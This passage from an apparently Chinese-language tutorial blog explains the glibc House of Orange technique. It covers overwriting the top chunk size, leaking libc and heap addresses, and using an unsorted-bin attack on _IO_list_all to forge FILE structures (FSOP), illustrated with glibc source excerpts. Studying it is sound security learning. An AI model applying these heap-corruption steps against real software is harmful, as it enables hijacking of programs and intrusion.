(mp_.mmap_threshold)</code> ，就会调用 mmap ，而一般 <code>mmap_threshold</code> 大小为 128*1024（0x20000），我们申请的大小小于它就行。</p><p>接着会有两个 assert  函数检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">old_top = av-&gt;top;</span><br><span class="line">old_size = chunksize (old_top);</span><br><span class="line">old_end = (<span class="keyword">char</span> *) (chunk_at_offset (old_top, old_size));</span><br><span class="line"> </span><br><span class="line">brk = snd_brk = (<span class="keyword">char</span> *) (MORECORE_FAILURE);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">   at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; pagemask) == <span class="number">0</span>));</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure><p>要求修改的 top_chunk 必须满足</p><ol><li><code>top_chunk_size</code> &gt; MINSIZE（0x10）</li><li>top chunk inuse 位为1</li><li>修改之后的 size 必须要对齐到内存页（0x1000字节）</li><li><code>top_chunk_size</code>小于申请分配的内存即可</li></ol><p><em>举个例子，假设 top chunk 的地址位于 0x6030d0 并且他的大小为 0x20f31 ，我们就应该重写他的大小为 0xf31 来绕过那些assert，并再次申请 0x1000 大小的 chunk。</em></p><p>满足上述四个条件后，继续执行就会触发 <code>_int_free</code> 把原来的 top chunk 给 free 掉，并放入 unsorted bin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">top (av) = chunk_at_offset (heap, <span class="keyword">sizeof</span> (*heap));</span><br><span class="line">set_head (top (av), (heap-&gt;size - <span class="keyword">sizeof</span> (*heap)) | PREV_INUSE);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Setup fencepost and free the old top chunk with a multiple of</span></span><br><span class="line"><span class="comment">  MALLOC_ALIGNMENT in size. */</span></span><br><span class="line"><span class="comment">/* The fencepost takes at least MINSIZE bytes, because it might</span></span><br><span class="line"><span class="comment">  become the top chunk again later.  Note that a footer is set</span></span><br><span class="line"><span class="comment">  up, too, although the chunk is marked in use. */</span></span><br><span class="line">old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">set_head (chunk_at_offset (old_top, old_size + <span class="number">2</span> * SIZE_SZ), <span class="number">0</span> | PREV_INUSE);</span><br><span class="line"><span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line"> &#123;</span><br><span class="line">   set_head (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">   set_foot (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ));</span><br><span class="line">   set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">   _int_free (av, old_top, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>此时我们已经得到了一个 unsorted bin ，当我们再次申请 unsorted bin 范围内的堆时，就会在 unsorted bin 中切割，同时也能泄露 libc 地址了。</p><p>需要注意的是，当我们再次分配堆的大小是 <code>large_chunk</code>（大于512字节） ，old_chunk 的堆地址会被放进堆中，也就是说我们既可以泄露 libc ，又能泄露出堆地址。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-orange/1635925124172582/6adb814eb3c1d230572acca3dc5d62e692e694f3.png" alt="1"></p><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>FSOP（File Stream Oriented Programming）是一种劫持 <code>_IO_list_all</code>（libc.so中的全局变量） 来伪造链表的利用技术，通过调用 <code>_IO_flush_all_lockp()</code> 函数来触发，该函数会在下面三种情况下被调用：</p><ul><li>libc 检测到内存错误时</li><li>执行 exit 函数时</li><li>main 函数返回时</li></ul><p>当 glibc 检测到内存错误时，会依次调用这样的函数路径：<code>malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; _IO_OVERFLOW</code>。</p><h3 id="IO-FILE-结构"><a href="#IO-FILE-结构" class="headerlink" title="_IO_FILE 结构"></a>_IO_FILE 结构</h3><p>先来看看 <code>_IO_list_all</code> 的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span>;</span></span><br></pre></td></tr></table></figure><p>是由 _IO_FILE_plus 结构体定义的一个指针变量，指向结构体内部。</p><p>再来具体看看 _IO_FILE_plus 长什么样子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>包含了一个 <code>_IO_FILE</code> 结构体和一个指向 <code>_IO_jump_t</code> 结构体的指针。</p><h4 id="IO-FILE-file"><a href="#IO-FILE-file" class="headerlink" title="_IO_FILE file"></a>_IO_FILE file</h4><p>_IO_FILE 结构体完全嵌入 _IO_FILE_plus 结构体中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;        <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="keyword">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">void</span> *__pad1;</span><br><span class="line">  <span class="keyword">void</span> *__pad2;</span><br><span class="line">  <span class="keyword">void</span> *__pad3;</span><br><span class="line">  <span class="keyword">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">size_t</span> __pad5;</span><br><span class="line">  <span class="keyword">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="keyword">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="keyword">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="keyword">void</span> *) - <span class="keyword">sizeof</span> (<span class="keyword">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stdin_</span>;</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stdout_</span>;</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stderr_</span>;</span></span><br></pre></td></tr></table></figure><p>这一大段源码晦涩难懂，但主要是要知道 FILE 结构会通过 <code>_chain</code> 域构成一个链表，链表头部用全局变量 <code>_IO_list_all</code> 表示，通过这个值我们可以遍历所有的 FILE 结构。</p><p>另外 <code>_IO_wide_data</code> 结构也是后面需要的：</p><h4 id="IO-wide-data"><a href="#IO-wide-data" class="headerlink" title="_IO_wide_data"></a>_IO_wide_data</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Extra data for wide character streams.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="keyword">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="IO-jump-t-vtable"><a href="#IO-jump-t-vtable" class="headerlink" title="_IO_jump_t *vtable"></a>_IO_jump_t *vtable</h4><p>其中 vtable 指向的  _IO_jump_t 结构体只是一个跳转表，当程序对某个流进行操作时，会调用该流对应的跳转表中的某个函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="unsortbin-attack-劫持"><a href="#unsortbin-attack-劫持" class="headerlink" title="unsortbin attack 劫持"></a>unsortbin attack 劫持</h3><p><code>Unsorted bin chunk</code>摘除代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>只看最后两行就行，<code>unsorted_chunk</code> 的<code>bk</code>指针指向的是它后一个被释放的 chunk 的块地址（bck），后一个被释放的chunk 的<code>fd</code>指针指向的是<code>unsorted_chunk</code>的块地址，如果我们能够控制<code>unsorted_chunk</code>的<code>bk</code>，那么就意味着可以将<code>unsorted_chunks (av)</code>，即<code>unsorted_chunk</code>的块地址写到任意可写地址内。</p><p>攻击之前布局</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-orange/1636028792269345/676223590900290aa3617ef9de4ad25352001180.png" alt="image-20211104202631960"></p><p>我们将<code>_IO_list_all-0x10</code>伪造成<code>bk</code>，那么此时<code>bck-&gt;fd = unsorted_chunks (av) = _IO_list_all --&gt; main_arena + 88</code></p><p>此时的  main_arena+88 相当于一个  IO_file_plus 结构，但是这里面的内容我们是不能完全控制的，但是 IO_file_plus 结构中还有个 _chain 指针，它位于 IO_file_plus+0x68 处，指向了下一个 IO_file_plus 结构体，像单链表一样串起来的。那么 _chain 在这就相当于 main_arena+88 + 0x68 = main_arena + 0xC0 处，而 main_arena + 0xC0 存储着的是 small bin 的头地址。所以，我们要让 main_arena + 0xC0 指向一个我们可控的地方，然后在那里伪造第二个 IO_file_plus 结构，即通过转移，让它转移到我们可控的地方。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-orange/1636030154919522/bef45e53bde9a01d902c73a455c4a7a2eeb59b27.png" alt="image-20211104204914735"></p><p>我们可以把 unsorted bin 的头结点的 size 改成 0x60 ，这样当我们调用 malloc ，glibc 会整理 unsorted bin ，把其放入 small bin 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *  </span><br><span class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes)  </span><br><span class="line">&#123;  </span><br><span class="line"><span class="comment">/* remove from unsorted list */</span>  </span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;  </span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span>  </span><br><span class="line">  </span><br><span class="line">          <span class="keyword">if</span> (size == nb)  </span><br><span class="line">            &#123;  </span><br><span class="line">              set_inuse_bit_at_offset (victim, size);  </span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)  </span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;  </span><br><span class="line">              check_malloced_chunk (av, victim, nb);  </span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);  </span><br><span class="line">              alloc_perturb (p, bytes);  </span><br><span class="line">              <span class="keyword">return</span> p;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">/* place chunk in bin */</span>  </span><br><span class="line">  </span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))  </span><br><span class="line">            &#123;  </span><br><span class="line">              victim_index = smallbin_index (size);  <span class="comment">//victim_index=6</span></span><br><span class="line">              bck = bin_at (av, victim_index);  <span class="comment">//bck=&amp;av-&gt;bins[10]-0x10</span></span><br><span class="line">              fwd = bck-&gt;fd;  <span class="comment">//fwd=&amp;av-&gt;bins[10]</span></span><br><span class="line">            &#125;  </span><br><span class="line">...  </span><br><span class="line">mark_bin (av, victim_index);  </span><br><span class="line">victim-&gt;bk = bck;  </span><br><span class="line">victim-&gt;fd = fwd;  </span><br><span class="line">fwd-&gt;bk = victim;<span class="comment">//&amp;av-&gt;bins[10]+0x18 = old_top  </span></span><br><span class="line">bck-&gt;fd = victim; </span><br><span class="line"> </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>main_arena 结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">  <span class="comment">/* Serialize access.  */</span>  </span><br><span class="line">  <span class="keyword">mutex_t</span> mutex;  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span>  </span><br><span class="line">  <span class="keyword">int</span> flags;  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Fastbins */</span>  </span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span>  </span><br><span class="line">  mchunkptr top;  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span>  </span><br><span class="line">  mchunkptr last_remainder;  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span>  </span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span>  </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Linked list */</span>  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized </span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span>  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on </span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by </span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span>  </span><br><span class="line">  INTERNAL_SIZE_T attached_threads;  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span>  </span><br><span class="line">  INTERNAL_SIZE_T system_mem;  </span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;  </span><br><span class="line">&#125;;  </span><br></pre></td></tr></table></figure><p>av -&gt; bins[10] + 0x18 = main_arena + 0x58 + 0x8*10 + 0x18 = main_arena + 0xC0 = old_top</p><p>我们让 unsorted bin 的 size 为 0x60，是为了让 chain 指针正好重新指回来，指向我们可控的地方。</p><h3 id="malloc-函数报错处理"><a href="#malloc-函数报错处理" class="headerlink" title="malloc 